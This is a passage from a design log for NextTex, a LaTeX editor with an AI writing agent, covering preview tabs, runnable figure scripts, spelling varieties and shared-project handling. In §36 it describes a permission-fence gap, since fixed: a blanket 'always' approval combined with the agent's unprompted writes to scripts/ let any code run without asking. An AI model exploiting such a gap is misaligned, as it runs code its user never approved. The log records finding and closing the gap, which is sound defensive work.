removal is in flight, because the server publishes the new strip over the
event stream before it answers the request: for a moment the strip was
without the document while its chapter was still the tab in front, and the
first browser test caught the effect asking for the document straight back.

The gesture is this window's. Another window's removal arrives as
`previews_changed` and closes nothing here, because the strip is shared
between windows and the tabs are each window's own; a strip that lost a
document while you were reading it in another window is one thing, and
tabs that vanished for it is another.

### A followed document leaves with its last file

The writer said the reverse could not be automatic "because of the whole
parent issue", and asked for it to be thought out and done if a safe form
existed. The naive form, closing a source closes its document's preview,
is unsafe for four reasons and impossible for a fifth. The strip is shared
viewer state, so a preview closed here would be gone from every window. A
preview may have been added with `+` and never had a source open at all,
or be there to read the PDF. The agent edits files that are not tabs. And
retiring a document cancels its compiler and removes its stand-in, so
putting a thesis back costs a full build. The fifth is that the last
document on the strip cannot go. Three variants were considered and set
aside: asking, which is a prompt on every tab close; a setting, which is a
setting to explain; and an origin flag in `previews.json`, which is a
server format change, and so a major version, for a per-window question.

The safe form is narrow on purpose. The window remembers which documents
*it* put on the strip by following an opened file: `followed`, a set in
`App.tsx` that is added to only in the effect that asks the server for a
file's document, and only when the strip did not have that document
before the answer. Such a document was never asked for; it appeared
because a tab did, so it may leave when the tab does. `unfollowed` in
`tabs.ts` names the followed documents with no open file left, after any
close, and never names the last document on the strip, keeping the one in
front. A document added with `+`, restored from `previews.json` on load,
or put on the strip by another window is not in the set and is never
closed this way. And a followed document becomes the writer's the moment
they act on it by name on the strip, clicking its tab, cycling to it with
`Mod-Alt-P`, keeping it with *the others*, or downloading its PDF, since
touching it is asking for it.
The removal is quiet: a refusal or a network failure on a removal the
writer never asked for is not theirs to read.

The known gap was stated rather than hidden. After a reload the set was
empty, so every document then on the strip read as asked for, and a
chapter opened before the reload could be closed after it without its
document following. That erred the safe way, and the alternative was
the format change above; §36 records the third way, the window's own
session storage, which closed it.

## 35. Scripts run from the source pane, and previews that follow a rename

Two requests in one message, and a bug found while reading for them. The
writer asked for a preview that is reconciled or closed when its source
file is moved, renamed or deleted, and for the figure scripts the agent
writes to be visible and runnable from the source pane, with what they
print and draw shown in the preview pane and a way to hand a failure to
the agent. This section records the run, in the order the work went.

### A script is a file the editor opens

The README had said for a year that the two files the plot tool seeds,
`scripts/figure.py` and `scripts/plotstyle.mplstyle`, were the writer's to
open and change. Neither could be opened. `.py` and `.mplstyle` were not
in the server's `TEXT_SUFFIXES`, so the file route answered 415, the
collaboration store gave the file no shared document, and the editor
showed the download card it shows a binary. The browser's own list called
`.py` text, which is why the row looked openable and the click did
nothing useful.

Both lists now name `.py`, `.mplstyle`, `.csv`, `.tsv` and `.dat`. The
data formats are there because a script reads them and a writer who is
editing the script wants to look at the columns beside it; a dataset too
large for a shared document becomes a blob at the store's two megabyte
bound, which is where that decision already lived. A project opened by
an older NextTex carries its scripts in the manifest as blobs, and a
manifest record is left alone on every later open by design, so `adopt`
gained one exception: a record the tree now calls text is promoted in
place, under the same id, and its document is seeded from disk the way
any text record with no log yet is. Never the other direction, since a
text record is a document somebody may be editing.

**A script reads as Python.** The editor was one LaTeX configuration, and
a `.py` opened in it had `def` as prose and a backslash offering
`\section`. The language is a compartment now, `languageCompartment` in
`editor-setup.ts`, filled per state by `languageFor(path)`: the LaTeX
mode with its completions, its `\ref` links, its command families and its
maths hover, or the Python mode with a four space indent and none of
those. The highlight style was at first the same near-monochrome one, on
the argument that a script should read with the prose's weights rather
than in a second palette a pane away; the writer asked for colour there
too, and §36 records how the Highlighting setting now reaches a script.
The spell checker stays off code: `isCode` in `file-kinds.ts` names the
suffixes, and `applySpelling` in `Editor.tsx` clears the compartment for
them, since every identifier in a script is a word the dictionary has
never heard of.

The file tree draws a script with a play mark on the sheet, the same mark
the run control carries below, and nothing else in the tree has a
triangle on it.

### A document that moves keeps its tab, and one that goes takes it

The writer's first request was one sentence: if a source file is moved,
renamed or deleted, reconcile the preview or close it, so a new one can be
built. Reading for it found that nothing had ever tried. A previewed
`main.tex` renamed from the tree stayed on the strip under its old name,
with a scheduler that would build a file no longer there, and the next
open dropped it without a word; a deleted document kept its tab and its
stale page. The mechanics are `reconcile_documents` and are described in
`docs/architecture.md`; this section is what the writer sees.

**A rename moves the tab where it is.** `main.tex` becoming `paper.tex`
leaves the strip in the same order with the new name in the old place,
still in front if it was, and the page rebuilds on its own. The source
tab moves at the same instant, because the server's `previews_changed`
carries the mapping and the browser moves both strips in one store
write, the rule §34 established for closing. The order mattered: with the
strip moved and the source tab still reading the old name, the effect
that makes the page follow the file asked the server to preview a file
that no longer existed and put its refusal on screen as a notice. The
browser test renames a previewed document with its tab open and asserts
that nothing was said.

**A folder move carries what is inside it**, and a move that lands on a
name already building to the same PDF, `sub/main.tex` beside `main.tex`,
is the one move the strip cannot follow: the document leaves and a
notice says which file it collided with, since the tab silently vanishing
is the failure §33 was written against.

**A deletion closes the preview**, and the neighbour on the left comes
forward, as after closing a tab by hand. The last-document rule does not
apply: it exists to keep the writer from emptying their own strip, and a
document in the trash is not on the strip whatever the rule says. So a
project whose only document was trashed has an empty strip, and the pane
says *No document to preview* and points at the trash and the `+` menu.
It used to say *Nothing has been typeset yet* and offer to load a
template, which is the copy for a folder that has never had a document
and is wrong for one that has a chapter in the trash. Restoring the
document from the trash puts it back on the strip; restoring a chapter
changes nothing there, because its document never left.

**Changes from outside arrive too.** An `mv` in a terminal, a `git
checkout`, or a rename the agent makes with its shell reach the session
only as the watcher's `files_changed`, and the re-scan behind that event
now checks each registered document against the disk before it publishes.
A collaborator's rename lands through the shared manifest and takes the
same path a rename made here does.

### A script runs from the source pane, and its output is a tab on the preview strip

The writer's second request was the feature: the figure scripts should be
visible in the source pane and runnable from it, so that a manual change
to a figure is a change to the script and a rerun rather than another
conversation; the output, what the script prints and what `plt.show()`
would have shown, goes in the preview pane; and a failure should have a
path to the agent. What follows is what was built, and the decisions it
took.

**Run is where the file is.** A Run control sits at the end of the source
strip while the tab in front is a `.py`, in the same 26 px quiet button
the fold chevron uses, with the play mark the file tree draws on a
script's sheet; it becomes Stop while the run is going. `Ctrl-Enter`,
which on a chapter scrolls the page to the caret, runs a script, because
that is the key every notebook and every editor with a run command uses
and the two meanings never meet on one file. The tree's row menu offers
*Run* on a script, beside *Plot this…* on a dataset, since a script's
reason to have a menu opened on it is that somebody wants to see what it
does; from there the script opens and runs in one gesture.

**The output is a tab, not a pane.** The preview strip is the place a
writer reads the result of what they typed, and a script's result is
that. So a script in front of the editor puts a tab for it after the
documents on the preview strip, the way a chapter puts its document
there, drawn by the same `TabStrip` with the extension a source tab
carries, a dot that breathes while it runs and turns to the error colour
after a failure, and a close button. It is this window's own: store state
and never the server's strip, because a run's output is read beside the
script and another window's script is not this window's reading. One
script at a time; a different `.py` replaces it. A chapter coming to the
front puts the page back and leaves the tab, so a writer moves between
the figure's script and the paragraph that describes it with the output
one click away; clicking the tab brings the run back; running always
brings it forward. The page is behind the run, not replaced by it: the
same hidden-not-unmounted treatment a folded pane gets, so coming back
finds the page at the scroll and zoom it was left at rather than
fetched again from the top. A build that lands while the run is in
front is laid out behind it and refitted when the page returns, the way
it is behind a folded pane; the line it would have revealed waits for
the next cursor move.

**What the pane shows, top to bottom.** The same furniture row the image
viewer's footer uses, with the path, Run or Stop, and the outcome in four
words: *Ran in 1.3 s*, *Exit 1*, *Stopped after 120 s*, *Stopped*,
*Running*, *Not run yet*. Then the figures the run drew, each on the
`.nx-page` paper the image viewer puts a figure on, because a plot with a
transparent background is judged against white on the page; every
`plt.show()` is one, and so is a figure left open at the end, so a script
written for a screen shows its plots here instead of in a window that
will never open. Then *Wrote figures/runs.pdf* for each file the run
saved into the project, a button that opens the file in the editor's
viewer. Then what it printed, in the code face, and what it wrote to
stderr, which on a failure has its last line set in the ink and the
frames above it a step back, since the last line is the sentence that
says what went wrong. The empty state says what Run will show.

**The two ways forward from a failure.** Under the traceback, *Ask the
agent* seeds the composer, never sends, with the `Fix` button's rule from
§28: *Fix scripts/fig.py. I ran it from the editor and it failed with
exit 1:*, a fenced block of the last forty lines of what the script said,
clipped to four kilobytes, and *When it runs, say what you changed*, so
the answer is something to read rather than a silent rewrite. The button
is not drawn on an install with no agent, the way the selection verbs are
not. *Install seaborn* appears when the traceback named a missing module,
and it takes two presses: the first turns it into *Yes, install seaborn*
and says beside it that this downloads from PyPI and runs the package's
installer, then runs the script again. The README's list of what leaves
this machine names the button as the second press that reaches
`pypi.org`. When the agent rewrites a script whose failed run is on
screen, a line says so and offers *Run again*; the pane never reruns on
its own, because the agent's runs pass the permission fence with the
script as the card's text and a rerun from here of code the agent just
wrote would not.

**The run itself is the agent's run.** Both go through `ScriptRuns` on
the session, so a figure the agent drew appears in the pane too, and the
mechanics, the runner that captures figures, the flush before the run,
the events and the kept result, are in `docs/architecture.md`. One thing
is worth saying here: the shared documents are flushed before every run,
because the disk trails the editor by the debounce and a writer who
changes an axis label and presses Run within a tenth of a second would
otherwise have run the old script and read the old figure with no way to
tell.

**Deliberately not done, then.** Streaming stdout while a script runs
was left on the argument that the compile does not stream its log either
and a result at the end fits the two minute bound; §36 records it done.
Running on save or on an agent edit stays out, for the fence reason
above. Figures as SVG beside the PNG. A `run_script` tool for the agent
that reruns by name without rewriting, and OpenAI-provider parity for
the plot tools, which was already absent. What is still left is in
`TRACKER.md` with its reason.

## 36. The backlog, worked

`TRACKER.md` had held thirty-six backlog lines since the script run, each
with its reason. The writer asked for a plan that addressed them, and
for colour in the editor for Python. This section records what that run
changed in the interface, one subsection per change, in the order the
work went; the mechanics are in `docs/architecture.md` and the lines
that stay are still in the tracker with their reasons.

### A script takes the same colours as a chapter

§35 left a `.py` near-monochrome whatever the Highlighting setting said,
on the argument that a script should read with the prose's weights rather
than in a second palette a pane away. The writer's view was that the
setting is one setting, and a script under it should be lit as the
chapter beside it is. So there is no second palette: the five family
tokens are reused, and the mapping is by kind. A keyword is structure,
so `def`, `return` and `import` take the sectioning colour; the name
after `def` or `class` is what an environment's name is to LaTeX and
takes the environment colour; a string is a literal the way a citation
key is and takes the citation colour; a number is mathematics; and a
builtin or a decorator is something the environment provides, which is
what the preamble does, so both take the preamble colour. Comments stay
in the third ink, italic, as they do in a chapter.

The mechanism differs from the chapter's because the problem does. The
LaTeX mode calls every control sequence the same token, which is why the
families are a decoration pass keyed on the command's name; the Python
mode already tells a keyword from a string from a decorator, so a script
needs no pass, only a HighlightStyle whose colours are variables with
the ink as the fallback. `.nx-syntax-colour .cm-editor` in `styles.css`
fills the five variables from the five family tokens and nothing else
does, so with the setting off every token falls back to the subtle
colour it always had and the switch stays two CSS variables rather than
a reconfiguration. Each style is scoped to its language now, the LaTeX
one to the LaTeX mode and the Python one to the Python mode, where
before the LaTeX style was installed once for every buffer and a script
took whatever its generic tags happened to match.

Emphasis reaches a script the same way. A keyword is set a step heavier
than the prose and the name after `def` with it; Plain takes the weight
off and hands the keyword the quiet slate through the same variable a
plain `\textbf` reads, so `def` never looks like the word after it. The
contrast test gained no pairs, because no colour was added: the five
hues the writer chose against rendered candidates are the five hues a
script gets. One tangent on the way: the Python mode names `self` as a
token type of its own, which is not a tag the highlighter knows, and the
console had been warning "Unknown highlighting tag self" once per page
with the word taking no style; it is a special variable now, set in the
second ink like any other name.

### A build says what the log said

The in-app agent, working on a real paper, reported that `compile`
answered "built cleanly" while every citation in the PDF was a question
mark, and that it stayed that way across repeated builds until it ran
bibtex by hand. Two things were true. The tool's text mentioned only
errors, and an undefined citation is a warning; and every build after
the first is a fast pass, one pdflatex with no bibliography step, unless
an edit touched a citation key, a label, the preamble or a `.bib`, so a
document whose bibliography the fast pass could not reach was rebuilt
the same way each time and reported the same way each time.

The tool answers a line now, `cas_paper/x.tex: 28 pages, 0 errors, 3
warnings, 2 undefined citations (smith2020, jones2021), 1 overfull
boxes, 1.9 s`, with the errors under it when there are any, and it takes
a `document`, because a project can hold several and the tool could
only ever build the one on screen. A name the project does not build is
refused with the list, since the session would otherwise build the
visible document and the report would carry the wrong name over the
right counts. `compile_diagnostics` groups what it lists under each
document's name, where before a supplement's error read as the paper's,
and the system prompt now says that a project can hold several documents
and that the counts are the thing to read. The scheduler's half is in
`docs/architecture.md`: after a fast pass the keys the log left
undefined are compared with those the last full pass left, and a
difference earns the next build a full one. A difference and not a
presence, because a misspelled key survives every full pass and would
otherwise make every keystroke a latexmk run.

### A double-click into a chapter that is not open lands where it should

Every earlier double-click on the page had landed in a file that was
already open. A chapter opened by the click itself was handed to the
editor before the server's first sync had filled it, so the jump to the
line synctex named was clamped against a one-line document and the
caret sat at the top of the right file, which read as the inverse search
being off by a page. The editor now waits for that first answer before it
builds the buffer, so the line exists when the jump asks for it, and the
pane never shows the empty document on the way. Found while writing the
subfolder test below; `navigation.spec.ts` holds it as its own case.

### A document in a subfolder is built from its own folder

The agent reported that a document at `cas_paper/x.tex` had its `\input`,
`\graphicspath` and `\usepackage` resolved against the project root, so
a figure beside it was not found and a root copy of a style shadowed the
local one, and that nothing said so: the toml has no working-directory
field and the error message named the path as written. Every document
had been compiled from the root, which was only ever right by accident
while every document sat there.

The engine runs from the document's directory now, the way `pdflatex
x.tex` run in that folder does, and the root stays on the search path so
a path written from the root still resolves; the precedence is the
folder first, which is the order the agent wanted. Output still lands in
the project's one build directory under the document's jobname. The
`nexttex.toml` section of the README says where a document is built
from, which is the sentence that was missing, and `navigation.spec.ts`
opens a document in a subfolder that `\input`s a file beside it and
double-clicks into that file, which proves the build, the log's paths
and the synctex map all moved together.

### A reference arrives from whoever holds its DOI, set for pdflatex

`add_reference` asked Crossref and nothing else, so a DOI registered
with DataCite, which is every arXiv preprint, every Zenodo record and
most datasets, was refused, and the agent pasted two preprints in from a
`curl` against `doi.org` by hand. And what Crossref did return carried a
record's Unicode as it was: a Greek letter or an accented name in a
title breaks pdflatex under any style that prints titles, and an
acronym in a title is lowercased by a title-casing style. The agent
cleaned nine entries by hand.

Crossref is still asked first, because its record is the one the
citation key and the checker are built on; on a 404 the request goes to
`doi.org`, whose content negotiation forwards it to whichever agency
holds the DOI, for the BibTeX and for a CSL JSON record folded into
Crossref's shape, so the key, the title the panel shows and
`check_references` all work for a preprint as for a paper. The entry is
made safe on the way in: Greek letters become maths, accented Latin
letters become the accent commands with the dotless i and j where they
belong, a bare ampersand is escaped, and a run of capitals in a title is
braced. Nothing already written as a command is touched, so a record
that says `\textit{o}-nitrophenol` still does. `doi.org` was already in
the README's list of what leaves this machine; the list is unchanged.

### The agent can turn the preview to a page

The agent had `goto`, which opens a file in the editor at a line, and
nothing for the preview, so an agent reviewing a long document could say
"the table on page 12 overflows" and not show it, and the agent working
on the real paper said the cursor was not the unit of work for a
document of that size. `show_page` names a document on the strip, or the
one in front, and a page; the browser brings the tab forward and turns
the pane to the page, waiting for the page to exist when the switch and
the page arrive together. The record row reads *Turned the preview to a
page*, in the verb table beside *Moved your editor*; the two script
tools, which had fallen to the default verb, got their lines in the same
change.

Writing the browser test found the page control wrong in scrolling
mode. The number it showed was the first page inside the drawing
window, and that window reaches four hundred pixels above the view, so
for the first four hundred pixels of every page the control named the
page before. Turning to page two put its top exactly at the top of the
view and the control went on saying one. It names the page with the
most of itself in view now, as a share of the page rather than of the
view, so a short last page scrolled fully in wins over the tail of the
page before it, and a tie goes to the first.

### Duplicate is in the file tree as well

The tab strip had *Duplicate* and the tree did not, on the argument that
the menu asked for was the strip's and a row menu already holding
twelve items was not somewhere to add a thirteenth without being asked.
The backlog was asked. It sits under *Rename*, the same route and the
same naming rule. It was a file's row only at first, copying a folder
having failure modes of its own, and the backlog run decided them: a
folder is copied with its symlinks, its `.git` and other machinery and
NextTex's own files left out, named whole (`v1.2 (copy)`, not
`v1 (copy).2`), and each text file in the copy begins its history with
a version saying which file it was copied from. The project's root is
the one folder that cannot be duplicated, since the copy would carry
`.nexttex/` and the build directory into a child of itself.

### What this window followed survives its reload

§34 left the `followed` set as browser memory, because persisting it
in `.nexttex/previews.json` was a stored format change and so a major
version, for a per-window question. The third way was in front of the
question all along: `sessionStorage` is exactly a window's own memory
that survives its reload and reaches no other tab, which is the shape
the set wants, since the strip is shared between windows and this is a
memory of what one of them did. `followed.ts` holds it, keyed by
project, guarded against storage that throws, and pruned against the
strip on every change as before. Nothing on the server changed, and
`related-tabs.spec.ts` reloads a window with a followed document on the
strip and watches the document leave when the chapter that brought it
closes.

### What a script prints arrives while it runs

§35 left a script's output to arrive when the run ended, which fit the
two minute bound and was what the compile does with its log; a script
printing progress for ninety seconds showed nothing until then. The
pane appends now. The child runs unbuffered, so a `print` leaves it as
printed; the server reads both pipes as they fill and publishes
`script_output` frames between the run's start and its end, a frame per
stream at most every tenth of a second or sooner at four kilobytes, so
the event stream is never flooded and the frame order is the output
order; the pane draws the run so far under the same blocks the finished
result uses and keeps the end in view unless the reader has scrolled up
to read something earlier, in which case the view is theirs until the
next run. A second window opening the script mid-run is handed what has
been printed so far beside the last result, and the done frame replaces
the live text with the whole. Nothing changed about what is kept: the
result on disk is what it was.

### The agent can run a script by name

The pane's Run was the writer's and the agent could only rewrite a
script to run it, so re-drawing a figure after the data changed meant
`run_plot_script` writing the same file again. `run_script` runs a
script already in `scripts/` by name and reports what it printed, drew
and saved, and the pane follows the run as it follows any other. It is
fenced exactly as writing one is, asked at the first position and the
middle one with the code on disk as the card's text, silent only at
the last, and the record row reads *Ran a script*.

Looking at the fence for it found a hole older than the tool. An
"always" on a script card was remembered as the bare tool name, so one
yes on one script let every later script run silently, while the
agent's own `Write` into `scripts/` passes the middle position without
a card: the two together were a way to run anything unasked. A script
tool's rule is the digest of the code the card showed now, and a
package install's is the package's name, so a yes covers exactly what
was shown and nothing shown later. OpenAI's provider gets neither
script tool: it puts no card up at all, because everything it can do is
confined by construction, and a tool that runs Python needs the card
before it can have the tool. That is in the tracker with its reason.
(It has the card and the tools since the backlog close-out, §48.)

### Which English

The tracker had the checker down as knowing one variety of English, and
the first fix for that, in the run that shipped it, added British forms
to the American list by hand, so the checker then accepted both
spellings of every word and told `color` from `colour` nowhere. That was
the right default for a checker that must not underline what a writer
wrote correctly, and the wrong ceiling for a thesis that is written in
one English and would like the other flagged.

The British forms come from the real `wbritish` list now, as a
difference on the American one, what British English adds and what it
takes away, nineteen kilobytes of text and seven after brotli in the
same lazy chunk, decoded into a second set on first use; the American
list is the American list again. Beside the spelling switch is a
Variety control, Document, British or American. The last two are what
they say. Document is the default and means what the open document's
own preamble says, from its babel or polyglossia options, read by the
symbol scan that already opens every file and carried in the symbol
table the editor already fetches, so a British thesis is British for
everyone who opens it with nobody setting anything, and a chapter is
held to the English of the document that reads it, since a chapter has
no preamble of its own. A document that says nothing gets both
spellings, which is exactly what the checker did yesterday, so no
upgrade underlines a word it did not underline before. The document's
answer travels with the symbol table, on open and after a build, rather
than on the keystroke that typed the babel line; the sheet's comment
says so, and the cost is a regex over a file the scan already reads.
The accepted-word list stays per project and shared, as it was, since
that decision was already made; what a shared project with two writers
in two settings does is that each is held to their own choice, and to
the document's when neither has chosen.

### The verb row clears the selection it is about

The writer reported the row of verbs over a selection, Reword, Shorten
and the rest, covering the first line of what was selected. Two things
were wrong in the placement. It was put thirty pixels above the first
selected line and it is taller than thirty pixels, so its bottom edge
sat on that line with room to spare above; and when there was no room
above, which is whenever a selection starts at the top of the view, as a
selection made after scrolling to a paragraph does, it was clamped to
the top of the pane, which is squarely over the first line. The comment
beside the clamp said the row was pushed below the selection in that
case, and the code did not do it.

The row is measured once it is drawn and placed with its real size:
above the first selected line by preference; below the last selected
line when there is no room above; and only when the last line is off the
bottom of the view does it sit at the foot of the pane, over whichever
line is there, which is the one case with no clear ground.
`verb-row.ts` holds the arithmetic with its own tests.

That fix moved the row a few pixels and the writer reported it again,
with a picture: the row on line 33, whose label it carried. Line 33 was
a summary paragraph wrapped over four rows, and the selection was on the
third. The row was anchored on the first selected character, so "above
the first selected line" was true of the visual row and false of the
line: the row sat on the second row of the paragraph it was about. It is
anchored on line blocks now, `EditorView.lineBlockAt` for the first and
last selected positions, which are whole logical lines however many rows
they wrap to, plus their leading; clear of the block is over the blank
line before the paragraph, or after it when the paragraph starts above
the view, and a selection whose end is beyond what the editor has drawn,
the whole of a long file, gets a row at the foot of the pane rather than
none, since the block exists where the glyph does not. The cost is that
a selection deep in a tall paragraph gets its row at the paragraph's
edge rather than beside the selected rows, and that is the right cost:
every row in between is the text the row is about. `agent.spec.ts`
measures the row against the `.cm-line` element under the selection,
the whole wrapped block, rather than against the selection's highlight,
which is one visual row and was clear while the paragraph was covered;
it selects inside a wrapped paragraph with the keyboard and by dragging
with the mouse, which is how the writer selects and which no test did.

The row also stayed where it was placed while the page scrolled under
it, so a selection followed by a turn of the wheel put it over whatever
had scrolled to that spot, often the selection. It follows the page now,
re-placed from a `scroll` listener on the editor's scroller and a
`ResizeObserver` on the pane, and rendered only when its position
changed. A listener rather than the view's update flags, because a
scroll inside the rendered viewport changes neither the viewport nor
the geometry, and the block heights and `documentTop` the placement
reads are already right when the event fires. The same spec scrolls
after selecting and checks the row moved by the same amount.

### History is keyed by the file, not by its name

Three keyspaces met in the history: the path slug the log was filed
under, the collaboration file id, and the trash entry id, and the
tracker named that meeting as the root cause behind two findings already
fixed by narrower means, a rename on the other machine and a restore
under a taken name. The rekey is done: every log is named after the
manifest's file id, the map beside the logs is `files.json` keyed the
same way, and `format` under `.nexttex/history/` says so. A rename is a
map update and no log moves; a deletion's version is announced to peers
through the id, where looking the file up by path had skipped its
trashed record and dropped the news until the next reconnect; a file
restored beside whatever took its name keeps its own past and the other
file keeps its own, since each has its own log, where before one log held
both and was cut at the deletion; and a trash entry carries the id it
took the file under, so a restore records under the same key whatever
the file is called when it comes back.

The migration runs once, when a session binds a history still keyed by
slug to its store, and the rule it rests on is the one that first looked
wrong: every record's log is at the slug of its *current* path, because
`note_move` kept it there, and the target is the record's id. The rule
that first looked right, moving only the records whose id was not their
slug, would have handed a file renamed away the past of the new file
born under its old name. Two phases through a staging directory, with
every source copied aside first, so an interruption anywhere restarts
from the copies and ends in the same place. An older NextTex opening a
migrated store finds no `paths.json` and reads an empty timeline: that
is what makes this the major version, and it is the only change in it.

The delete route tells the shared manifest about a deletion itself now
rather than waiting for the watcher, three or four hundred milliseconds
behind, because in that window a new file made under the same name found
the old record live and took its id, and with it the old file's past;
the agent deleting and recreating a file in one turn fits inside that
window easily. A history nobody binds to a store, which is what the
bench and a bare test build, keeps its slug keys and its `paths.json`
exactly as they were.

## 37. The tab names the paper, and the tutorial reads on both keyboards

### The browser tab says which project this is

Every NextTex tab said "NextTex", or "NextTex · dev" on a named install,
so a writer with a thesis and two papers open in three tabs had three
tabs that read the same and had to click through them to find the one
they wanted. The tab now reads `Thesis · NextTex` while the project is
open, the project's name first because a browser truncates a tab's title
from the end, and a row of tabs that all begin with the app's name says
nothing about what is in them. The instance name stays at the end, where
it was. On the project list, the sign-in screen and the offline screen
the tab is the app alone.

The title follows the screen, not the store's project: leaving a project
for the list keeps its name in the store so the list can offer the way
back, and the tab should not keep it. `page-title.ts` is the rule with
its own tests, and `navigation.spec.ts` opens a project, reads the tab,
goes back to the list and reads it again.

### Every key is written for both keyboards, from one place

Shortcuts were spelt three ways. The tutorial and the strip's stale hint
wrote Mac glyphs whatever the machine, `⌘S`; the run button and the link
hover sniffed `navigator.platform` and showed one form or the other; and
the agent button wrote `Ctrl/Cmd-Alt-A`. Every keydown handler in the app
reads `metaKey || ctrlKey`, so Cmd on a Mac and Ctrl anywhere else are
the same key to it and both spellings are true wherever it runs, and the
sniff is wrong on an iPad, which Safari calls a Mac or not by version.

`keys.ts` is the one implementation of the README's convention, the Mac
glyphs and then the words: `⌘⌥⇧T / Ctrl-Alt-Shift-T`, `⌘↵ / Ctrl-↵`,
`⌘-click / Ctrl-click`. A spec is written the way CodeMirror writes one,
`Mod-Alt-Shift-T`, and the tutorial, the strip, the settings sheet, the
run button, the link hover and the agent button all read from it, so
they cannot drift from each other again. The choice to show both rather
than detect is deliberate: a writer on Windows reading over a
colleague's shoulder on a Mac wants both, and the cost is a few
characters in a tooltip.

### The tutorial reads the app as it is, on both keyboards

The tutorial had drifted from the app in the way §20's own opening rule
says a document may not. The composer had six buttons where it said
four; `Approve everything automatically` had become the three-position
`What to ask about`; a permission card had grown `For this conversation`
and its key; `⌘S` had become a setting-dependent key that the sheet and
its own keyboard table described differently; the preview strip's `+`
had become an icon; `Esc` in the agent panel now stops a turn before it
closes the panel; the writing agent is chosen in the settings sheet, not
the README; and scripts, spelling, the selection verb row, quick-open,
the tab keys and `F8` were not in it at all. The text was written against
the code again, section by section, with the file each claim rests on
read first, and the two stale figures, the composer row and the tab
strip, were regenerated by `e2e/shots/tutorial.spec.ts`, which now opens
one extra file rather than two so the empty run the tab-strip figure is
about is visible rather than a sliver.

Every chord in it is written for both keyboards, from `keys.ts`: the Mac
glyphs on one line and the words beneath, in a key column widened to
hold `Ctrl-Alt-Shift-T`. The 26 px rows became a minimum rather than a
height, so a two-line key sits on the grid without clipping. The rows
are grouped by where the key works, Anywhere, In the source, On the
page, In the file list, In the agent panel, which used to be a clause
inside each description, and the section moved to the end: it is
reference material after a narrative, which is where the README keeps
its own table. The a11y spec opens the sheet and reads both forms of
seven chords, and checks the index ends on Keyboard.

The figures' declared sizes were wrong in every case, `712×34` for a file
that was `380×34`, `712×110` for one that was `240×236`. The `width` and
`height` on a figure exist so the sheet does not reflow as images arrive,
and with the wrong ratio it reflowed on every open. They are the files'
real pixel sizes now, generated at twice the display size as the spec's
comment always said they were.

## 38. A folder that is gone is gone from one disk

### What `rm -rf` used to say to everybody

A shared project is a set of installs that each hold the whole thing, and
nothing in the store ever asked whether the folder it was projecting into
was still there. So when a collaborator deleted their copy, or moved it,
or closed the lid on a laptop whose project sat on a drive that then went
away, the watcher reported every file missing, the store called each of
them deleted, the flags travelled through the manifest like any other
edit, and every other collaborator's copy went into their own trash, one
directory entry at a time. Nothing was lost, since the trash never
empties itself, and everything looked lost, which for the person tidying
a laptop after a paper was submitted is the worse of the two.

A folder that is not there is not a list of deletions. It is a fact about
this disk, and the store treats it as one: nothing is flagged, nothing is
written and nothing is logged once the root has been found missing, and
the session says so once and closes. The folder going away is reported
three ways, because the disk reports it three ways. A removal arrives as
one deletion per file with the root beside them; a move arrives as the
root alone, with no word about the files inside it; and a folder that
went while nothing was watching is found by the watcher when it next
looks. All three reach `note_root_lost`, which is idempotent.

The root exists until its last file has gone, so a slow disk can deliver
the first few deletions with the folder still standing. A batch naming
half the project or more is therefore held for one more debounce, and
the root is looked at again before any of it is published. A genuine
clearing-out inside a folder that stays is delayed by 120 milliseconds
and reaches the others exactly as before.

### What the writer sees

Not a message inside an editor over nothing. The browser is sent back to
the project list, where the row already reads "This folder is no longer
there." as it does for a folder that went while the server was down, and
a line above the list says that the folder for this project is gone from
this disk and, for a shared project, that the collaborators' copies are
untouched. "Find it…" on the row is the way back for a folder that was
moved: `.nexttex/` moves with it, the document logs inside it are the
sync state, and relocating a shared project reconnects it without
reconciling anything.

A peer's edit could also bring a moved folder back. The first thing to
touch the disk after an update arrives is its log, and `persist.append`
makes the directories it needs, so a project moved to a new home returned
to its old path as a `.nexttex/collab/docs` and nothing else. The log is
now refused under a missing root as the projection is.

### The removed install is told, once

Removing a collaborator wrote a tombstone into the shared manifest and
closed their link, in that order, and the order was the bug: the tombstone
was queued to the link and the link was marked dead before the queue had
drained, so the removed install never received it. It learned by dialling
and being refused, and a connection that succeeded reset the dial loop's
backoff, so it knocked every two seconds for as long as its server ran.
Its share panel showed every member as away, which reads as a network
problem on a machine that had been put out on purpose.

The tombstone is now the last thing the removed peer's link carries before
it is closed, and if that link was down it reaches them through whichever
member they next sync with, since the manifest is what every peer mirrors
its member list from. On arrival the install closes its links, stops
listening for the share and stops dialling, and the share panel says who
removed it, that the copy and its history stay, and that nothing typed
from now on reaches anyone; the tab strip draws nobody rather than a row
of collaborators who are away.

A refusal at the door is deliberately not the same signal. A peer refuses
from its own copy of the member list, and that copy can be behind: a
project restored from a backup, or a peer that was offline when somebody
was added, will refuse a member it has not heard of yet. Under the first
draft of this that one stale peer could put a member out for good. So a
`DENIED` backs the dial loop off from that peer and keeps the reason for
the panel, and only the tombstone in the install's own record, which only
an actual removal writes, means removed. Being let in anywhere clears the
reason.

### Leaving, which used to be `rm -rf`

There was no way out of a share except deleting the folder, and §38's
first section says what that did. The share panel now ends with Leave. The
confirmation says, in one sentence each, what happens to the others, to
this copy, and to getting back in: they carry on, the copy stays as a
project of this install's own with its history, and returning needs a new
invite. A checkbox, "and delete my copy from this computer", swaps the
middle sentence for the one that says the folder is deleted, and the
button's label changes with it, because a control that deletes a folder
should say so on its face.

On the server, leaving is a removal of oneself: the tombstone goes into
the manifest first, the links are given a moment to carry it, and only
then are the links and the transport closed and the share record and its
card removed, which is what makes the project private again. The manifest's
member list is cleared last, with no link open to carry the change, so
that sharing the same project again later starts with one member rather
than carrying the old ones along as collaborators who never connect. With
the box ticked the session is closed, the entry forgotten and the folder
removed, in that order, and only for a folder that is the registered root
of a project NextTex has worked in: the registry can hold any directory
somebody once pointed it at, and the route that deletes a folder must not
be the one that empties a home directory.

An install that was removed gets the same action under a different name,
"Keep it as a project of my own", at the foot of the notice saying who
removed it. Without it the record of the share stayed, and the panel said
removed on every visit for the life of the project.

### The missing row offers both ways back

A row whose folder is gone used to offer "Find it…", which is right for a
folder that was moved: `.nexttex/` moves with it, the document logs in it
are the sync state, and pointing NextTex at the new place reconnects a
shared project with nothing to reconcile. Relocating now also opens the
project, so its peers find it at its new home at once rather than at the
next open. For a folder that is really gone the row of a shared project
offers "Rejoin from collaborators…" beside it, known from the card in the
state directory rather than from anything in the folder. The field it
opens defaults to the old path, which is usually where the writer wants
the project back, and says that the collaborators send the project as it
